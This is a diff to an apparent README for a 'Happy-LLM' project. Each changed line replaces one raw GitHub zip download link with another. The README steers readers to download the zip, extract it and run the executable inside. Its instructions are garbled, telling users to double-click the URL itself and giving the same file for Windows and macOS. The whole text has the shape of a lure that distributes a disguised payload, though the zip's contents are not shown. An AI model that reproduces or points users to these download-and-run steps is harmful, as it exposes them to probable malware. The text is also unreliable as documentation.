@@ -8,9 +8,9 @@ Welcome to the Happy-LLM project! This guide will help you download and run the 
 
 To download the Happy-LLM software, click the button below:
 
-[![Download Happy-LLM](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip)](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip)
+[![Download Happy-LLM](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip)](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip)
 
-You can also visit the download page directly by clicking this link: [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip).
+You can also visit the download page directly by clicking this link: [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip).
 
 ## 💻 System Requirements
 
@@ -23,19 +23,19 @@ Before you proceed with the installation, make sure your computer meets the foll
 
 ## 📚 How to Download & Install
 
-1. **Visit the Download Page:** Go to [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip).
+1. **Visit the Download Page:** Go to [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip).
 
 2. **Choose the Latest Version:** You will see a list of available releases. Look for the latest version at the top of the list.
 
-3. **Download the Software:** Click on the file corresponding to your operating system. For example, if you are using Windows, you might see something like `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip`. If you are using macOS, look for `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip`. Save the file to a place you can easily access, like your Desktop or Downloads folder.
+3. **Download the Software:** Click on the file corresponding to your operating system. For example, if you are using Windows, you might see something like `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip`. If you are using macOS, look for `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip`. Save the file to a place you can easily access, like your Desktop or Downloads folder.
 
 4. **Extract the Files:** Locate the downloaded zip file, right-click on it, and choose “Extract All” or “Unzip”. This will create a folder with the application files.
 
 5. **Open the Folder:** Double-click the newly created folder to open it. Inside, you will see the application executable file.
 
 6. **Run the Software:** 
-   - For **Windows**, double-click `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip` to start the application.
-   - For **macOS**, double-click `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip`.
+   - For **Windows**, double-click `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip` to start the application.
+   - For **macOS**, double-click `https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip`.
 
 7. **Follow the Setup Instructions:** When the application launches, you may see a setup wizard. Follow the on-screen instructions to complete the installation.
 
@@ -60,7 +60,7 @@ If you encounter any issues while downloading or running the software, here are 
   **Solution:** Ensure your operating system meets the minimum requirements. If problems persist, restarting your computer can help.
 
 - **Issue:** Error messages during setup.  
-  **Solution:** Make sure you're using the latest version of the application. You can find updates on the [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip).
+  **Solution:** Make sure you're using the latest version of the application. You can find updates on the [Download Page](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip).
 
 ## 🌟 Features of Happy-LLM
 
@@ -79,7 +79,7 @@ Join our community for support and discussions. You can connect via forums or so
 
 To recap, you can download the software from the link below:
 
-[![Download Happy-LLM](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip)](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/ppt-llm-happy-v1.0.zip)
+[![Download Happy-LLM](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip)](https://github.com/Seth-blair/happy-llm-ppt/raw/refs/heads/main/ontocyclic/happy-ppt-llm-v1.1.zip)
 
 For further assistance, feel free to access community resources or reach out through our support channels.
 
